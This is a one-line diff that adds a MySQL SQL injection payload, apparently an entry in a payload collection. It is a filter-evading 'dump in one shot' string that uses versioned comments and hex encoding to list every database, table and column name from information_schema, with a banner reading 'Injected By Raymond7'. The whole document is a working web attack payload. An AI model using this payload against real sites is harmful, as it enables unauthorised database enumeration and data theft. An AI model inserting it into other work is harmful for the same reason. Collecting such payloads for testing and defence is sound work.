@@ -1,0 +1,1 @@
+concat(0x496E6A6563746564204279205261796D6F6E6437,0x3c62723e,/*!00000/*!00000(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,database(),0x3a3a,table_name,0x203a3a20,column_name))))x)*/)
